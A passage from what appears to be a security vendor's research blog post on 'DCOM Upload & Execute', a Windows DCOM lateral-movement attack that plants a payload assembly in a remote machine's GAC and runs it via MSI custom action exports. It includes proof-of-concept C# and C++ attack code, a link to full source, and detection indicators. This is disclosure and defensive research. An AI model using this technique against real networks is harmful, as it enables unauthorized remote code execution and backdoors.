workarounds, but our solution will be adding an export to our payload.dll assembly. As for calling this export, <em>IMsiCustomAction</em> has us covered once more.&nbsp;</p><p></p><h5>Running .NET Exports</h5><p></p><p>As I’ve mentioned, <em>IMsiCustomAction::LoadEmbeddedDLL</em> attempts to resolve some exports after loading a requested DLL and saves the results. When searching for code using the address of the results, we reveal three <em>IMsiCustomAction</em> methods, each invoking a respective export from the loaded DLL:&nbsp;</p><ol><li><p><em>IMsiCustomAction::CallInitDLL</em> <strong>invokes</strong> <em>InitializeEmbeddedUI&nbsp;</em></p></li><li><p><em>IMsiCustomAction::CallShutdownDLL </em><strong>invokes</strong> <em>ShutdownEmbeddedUI&nbsp;</em></p></li><li><span style="color:rgb(0, 0, 0)"><em>IMsiCustomAction::CallMessageDLL</em></span><span style="color:rgb(0, 0, 0)"> </span><span style="color:rgb(0, 0, 0)"><strong>invokes</strong></span><span style="color:rgb(0, 0, 0)"> </span><span style="color:rgb(0, 0, 0)"><em>EmbeddedUIHandler&nbsp;</em></span></li></ol><p>Each method provides different arguments to the respective export, and we will use <em>IMsiCustomAction::CallInitDLL</em> which provides the richest argument set:&nbsp;</p><pre>HRESULT CallInitDLL<strong>(</strong>ulong intVar<strong>,</strong> PVOID pVar<strong>,</strong> ulong<strong>*</strong> pInt<strong>,</strong> ulong<strong>*</strong> pInitializeEmbeddedUIReturnCode<strong>);<br bold="[object Object]"><br bold="[object Object]"></strong>// CallInitDLL calls InitializeEmbeddedUI with the following args:<br bold="[object Object]"><br bold="[object Object]">DWORD InitializeEmbeddedUI(ulong intVar, PVOID pVar, ulong* pInt)</pre><p></p><p>The combination of <em>ulong intVar </em>and <em>PVOID pVar</em> allows us great flexibility running our payload. For example, <em>PVOID pVar</em> can point to a shellcode our payload will execute, and <em>ulong intVar</em> will be its size.<span style="color:rgb(209, 52, 56)">&nbsp;</span></p><p>For this POC, we will create a simple implementation of <em>InitializeEmbeddedUI </em>in our <em>payload.dll</em> that displays a message box with attacker-controlled content.<span style="color:rgb(209, 52, 56)">&nbsp;</span></p><p>We’ll export <em>InitializeEmbeddedUI</em> <a href="https://blog.xpnsec.com/rundll32-your-dotnet/" target="_blank" rel="noopener"><u>from our assembly to a native caller</u></a> (msi.dll) with the “<em>.export</em>" IL descriptor<span style="color:rgb(209, 52, 56)">&nbsp;</span></p><p>We can now present the final POC of payload.dll:&nbsp;</p><pre><strong>using System;<br bold="[object Object]"><br bold="[object Object]">using System.Diagnostics;<br bold="[object Object]"><br bold="[object Object]">using System.Runtime.InteropServices;<br bold="[object Object]"><br bold="[object Object]">using </strong>RGiesecke.DllExport; // [DllExport] wraps ".export"<strong><br bold="[object Object]"><br bold="[object Object]">namespace </strong>payload<strong><br bold="[object Object]"><br bold="[object Object]">{<br bold="[object Object]"><br bold="[object Object]"> public </strong>class Class1<br bold="[object Object]"><br bold="[object Object]"> {<br bold="[object Object]"><br bold="[object Object]">   [DllImport("wtsapi32.dll", SetLastError = <strong>true)]</strong><br bold="[object Object]"><br bold="[object Object]">   static <strong>extern</strong> bool WTSSendMessage(IntPtr hServer, [MarshalAs(UnmanagedType.I4)] int SessionId, String pTitle, [MarshalAs(UnmanagedType.U4)] int TitleLength, String pMessage, [MarshalAs(UnmanagedType.U4)] int MessageLength, [MarshalAs(UnmanagedType.U4)] int Style, [MarshalAs(UnmanagedType.U4)] int Timeout, [MarshalAs(UnmanagedType.U4)] out int pResponse, bool bWait);<br bold="[object Object]"><br bold="[object Object]">   [DllExport]<br bold="[object Object]"><br bold="[object Object]"><strong>   public</strong> static int InitializeEmbeddedUI(int messageSize,[MarshalAs(UnmanagedType.LPStr)] string attackerMessage, IntPtr outPtr)<br bold="[object Object]"><br bold="[object Object]">   {<br bold="[object Object]"><br bold="[object Object]">    string title = "MSIEXEC - GAC backdoor installed";<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp;&nbsp;IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp;&nbsp;// The POC will display a message to the first logged on user in the target<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp;&nbsp;int WTS_CURRENT_SESSION = 1;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp;&nbsp;int resp = 1;<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp;&nbsp;// Using WTSSendMessage to create a messagebox form a service process at the users desktop<br bold="[object Object]"><br bold="[object Object]">&nbsp;&nbsp;&nbsp;&nbsp;WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, title, title.Length, attackerMessage, messageSize, 0, 0, <strong>out</strong> resp, <strong>false</strong>);<br bold="[object Object]"><br bold="[object Object]"><strong>    return</strong> 1337;<br bold="[object Object]"><br bold="[object Object]">   }<br bold="[object Object]"><br bold="[object Object]">  }<br bold="[object Object]"><br bold="[object Object]">}</pre><p></p><p>And the final lines of our DCOM Upload &amp; Execute attack:&nbsp;</p><pre>// runs after our call to pMsiAction-&gt;LoadEmbeddedDLL, loading our payload assembly<br><br>ulong ret1, ret2;<br><br>std::string messageToVictim = "Hello from DCOM Upload &amp; Execute";<br><br>hr = pMsiAction-&gt;CallInitDLL(messageToVictim.length(), (PVOID)messageToVictim.c_str(), &amp;ret1, &amp;ret2);</pre><p></p><p>&nbsp;Running the complete attack code will pop a message box on the remote target PC:</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt1983a99b0f1dbb97" alt="fig-21-DCOMUploadExec-commandlie.png" src="https://www.deepinstinct.com/image/blt1983a99b0f1dbb97/6757644c19cfd53944f09c82/fig-21-DCOMUploadExec-commandlie.png" height="auto"><figcaption style="text-align:center">Figure 21: DCOM Upload and Execute Client Commandline</figcaption></div></figure><p></p><p></p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt2a5e57ba00e31148" alt="fig-22-result-on-target-victim.png" src="https://www.deepinstinct.com/image/blt2a5e57ba00e31148/6757644ca3d52152cd51c310/fig-22-result-on-target-victim.png" height="auto"><figcaption style="text-align:center">Figure 22: Result on target victim</figcaption></div></figure><p></p><p><strong>For the full source code</strong>: <a href="https://github.com/deepinstinct/DCOMUploadExec" target="_blank" rel="noopener"><u>https://github.com/deepinstinct/DCOMUploadExec</u></a>&nbsp;</p><p></p><h5>Limitations</h5><p></p><ol><li><p>The attacker and victim machines must be in the same domain or forest.&nbsp;</p></li><li><p>The attacker and victim machines must be consistent with the <a href="https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c" target="_blank" rel="noopener"><u>DCOM Hardening patch,</u></a> either with the patch applied on both systems or absent on both.&nbsp;</p></li><li><p>The uploaded &amp; executed assembly payload must have a <a href="https://learn.microsoft.com/en-us/dotnet/standard/assembly/strong-named" target="_blank" rel="noopener"><u>strong name</u></a>&nbsp;</p></li><li><span style="color:rgb(0, 0, 0)">The uploaded &amp; executed assembly payload must be either x86 or x64 (Can't be AnyCPU)&nbsp;</span><br></li></ol><h5>Detection</h5><p></p><p>This attack leaves clear IOCs that can be detected and blocked&nbsp;</p><ol><li><p>Event logs that contain remote authentication data:&nbsp;</p><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blt8e955e2e7688a48b" alt="fig-23-Remote-login-event-log.png" src="https://www.deepinstinct.com/image/blt8e955e2e7688a48b/6757644c4f07d36e22f31c0a/fig-23-Remote-login-event-log.png" height="auto"><figcaption style="text-align:center">Figure 23: Remote login event log&nbsp;</figcaption></div></figure><p><span style="color:rgb(14, 40, 65)"></span></p></li><li><span style="color:rgb(0, 0, 0)">An MSIEXEC service that creates a child (the custom action server) with the command line pattern </span><span style="color:rgb(0, 0, 0)"><em>C:\Windows\System32\MsiExec.exe -Embedding [HEXEDICAMAL_CHARS]&nbsp;</em></span><figure><div data-img-caption-container="true" style="display:inline-block;text-align:center"><img asset_uid="blta4867b08c0c4cad6" alt="fig-24-proccess-tree-DCOMUploadExec.png" src="https://www.deepinstinct.com/image/blta4867b08c0c4cad6/6757644c197eca0089cde60e/fig-24-proccess-tree-DCOMUploadExec.png" height="auto"><figcaption style="text-align:center">Figure 24: Process tree during DCOM Upload &amp; Exec</figcaption></div></figure></li><li><span style="color:rgb(0, 0, 0)">The child MSIEXEC writes a DLL to the GAC&nbsp;<br><br></span></li><li><span style="color:rgb(0, 0, 0)">The child MSIEXEC loads a DLL from the GAC&nbsp;<br></span></li></ol><h5><strong>Summary</strong></h5><p><strong></strong></p><p>Until now, DCOM lateral movement attacks have been exclusively researched on IDispatch-based COM objects due to their scriptable nature. This blog post presents a complete method for researching COM and DCOM objects without depending on their documentation or whether they implement IDispatch.&nbsp;</p><p>Using this method, we expose “DCOM Upload &amp; Execute,” a powerful DCOM lateral movement attack that remotely writes custom payloads to the victim’s GAC, executes them from a service context, and communicates with them, effectively functioning as an embedded backdoor.&nbsp;</p><p>The research presented here proves that many unexpected DCOM objects may be exploitable for lateral movement, and proper defenses should be aligned.&nbsp;</p><p>If you are concerned about these stealthy attacks breaching your environment, <a href="https://www.deepinstinct.com/request-a-demo"><u>request a demo</u></a> to learn how Deep Instinct prevents what other vendors can’t find using the only deep learning framework in the world built from the ground up for cybersecurity.&nbsp;</p><p></p><h5>References</h5><p></p><ol><li><p><a href="https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/" target="_blank" rel="noopener"><u>https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/</u></a>&nbsp;</p></li><li><p><a href="https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/" target="_blank" rel="noopener"><u>https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/</u></a>&nbsp;</p></li><li><p><a href="https://github.com/tyranid/oleviewdotnet" target="_blank" rel="noopener"><u>https://github.com/tyranid/oleviewdotnet</u></a>&nbsp;</p></li><li><p><a href="https://securityboulevard.com/2023/10/lateral-movement-abuse-the-power-of-dcom-excel-application/" target="_blank" rel="noopener"><u>https://securityboulevard.com/2023/10/lateral-movement-abuse-the-power-of-dcom-excel-application/</u></a>&nbsp;</p></li><li><p><a href="https://www.cybereason.com/blog/dcom-lateral-movement-techniques" target="_blank" rel="noopener"><u>https://www.cybereason.com/blog/dcom-lateral-movement-techniques</u></a></p></li><li><p><a href="https://learn.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iclassfactory" target="_blank" rel="noopener"><u>https://learn.microsoft.com/en-us/windows/win32/api/unknwn/nn-unknwn-iclassfactory</u></a></p></li><li><p><a href="https://blog.xpnsec.com/rundll32-your-dotnet/" target="_blank" rel="noopener"><u>https://blog.xpnsec.com/rundll32-your-dotnet/</u></a></p></li><li><p><a href="https://www.nuget.org/packages/UnmanagedExports" target="_blank" rel="noopener"><u>https://www.nuget.org/packages/UnmanagedExports</u></a></p></li><li><p><a href="https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c" target="_blank" rel="noopener"><u>https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c</u></a></p></li></ol></div></div></div></div><div class="back-page container mx-auto"><div class="max-w-blog w-full mx-auto pt-9 border-t-2 border-blue"><div class="flex justify-between mb-12 md:mb-16"><a class="inline-block font-bold uppercase text-cta tracking-widder undefined button_btn--link__RQBF4 undefined button_btn--arrow-left__8dYK2 undefined button_btn--arrow-left-blue__c3n8m hover:underline mt-2" href="https://www.deepinstinct.com/blog">Back To Blog<i class="button_btn__icon__m_ZnD"><svg width="16" height="10" viewBox="0 0 16 10" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><g stroke="currentColor"><path d="M10 2l4 3-4 3M13 5H0"></path></g><defs><clipPath id="clip0"><path fill="currentColor" d="M0 0h15v9H0z" transform="rotate(-180 8 5)"></path></clipPath></defs></svg></i></a><div class="social-share SocialShare_social-share__4Q7V0"><button aria-label="linkedin" class="react-share__ShareButton social-share__btn linkedin hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="22" height="22" viewBox="0 0 22 22" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M4.58333 2.3913C4.58333 3.73043 3.575 4.78261 2.29167 4.78261C1.00833 4.78261 0 3.73043 0 2.3913C0 1.05217 1.00833 0 2.29167 0C3.575 0 4.58333 1.05217 4.58333 2.3913ZM4.58333 6.69565H0V22H4.58333V6.69565ZM11.9167 6.69565H7.33333V22H11.9167V13.9652C11.9167 9.46957 17.4167 9.08696 17.4167 13.9652V22H22V12.3391C22 4.78261 13.8417 5.06956 11.9167 8.8V6.69565Z" fill="currentColor"></path></svg></button><button aria-label="twitter" class="react-share__ShareButton social-share__btn twitter hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="23" height="19" viewBox="0 0 23 19" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M7.23329 19C15.9129 19 20.6595 11.6908 20.6595 5.35298C20.6595 5.14532 20.6553 4.93872 20.6459 4.73292C21.5673 4.05595 22.3683 3.21094 23 2.24946C22.1545 2.63129 21.2447 2.88841 20.2902 3.00434C21.2643 2.4106 22.0125 1.47093 22.3654 0.35098C21.4535 0.900584 20.4437 1.29996 19.3691 1.51533C18.5077 0.583106 17.2813 0 15.9244 0C13.3182 0 11.2048 2.14816 11.2048 4.79593C11.2048 5.17244 11.2464 5.53831 11.327 5.88956C7.40542 5.68934 3.92781 3.78048 1.60068 0.878514C1.19495 1.58712 0.961353 2.41086 0.961353 3.28911C0.961353 4.95308 1.79452 6.42214 3.06142 7.28178C2.28736 7.25758 1.56014 7.04114 0.924206 6.68165C0.92316 6.7016 0.92316 6.7218 0.92316 6.74281C0.92316 9.06593 2.55 11.0054 4.70893 11.4449C4.31261 11.5547 3.89564 11.6137 3.46505 11.6137C3.16108 11.6137 2.86548 11.5829 2.57799 11.5273C3.17861 13.4327 4.92082 14.8196 6.98635 14.8587C5.37102 16.1454 3.33635 16.9119 1.12563 16.9119C0.745015 16.9119 0.369369 16.8899 0 16.8455C2.08829 18.2058 4.56793 19 7.23329 19Z" fill="currentColor"></path></svg></button><button aria-label="facebook" class="react-share__ShareButton social-share__btn facebook hover:opacity-80" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><svg width="13" height="26" viewBox="0 0 13 26" class="icon inline-block align-middle" preserveAspectRatio="xMaxYMax meet" focusable="false"><path d="M3.25 8.66667H0V13H3.25V26H8.66667V13H12.5667L13 8.66667H8.66667V6.825C8.66667 5.85 8.88333 5.41667 9.85833 5.41667H13V0H8.88333C4.98333 0 3.25 1.73333 3.25 4.98333V8.66667Z" fill="currentColor"></path></svg></button></div></div></div></div></div></main></div></div><next-route-announcer><p aria-live="assertive" id="__next-route-announcer__" role="alert" style="border: 0px; clip: rect(0px, 0px, 0px, 0px); height: 1px; margin: -1px; overflow: hidden; padding: 0px; position: absolute; top: 0px; width: 1px; white-space: nowrap; overflow-wrap: normal;"></p></next-route-announcer></body></html>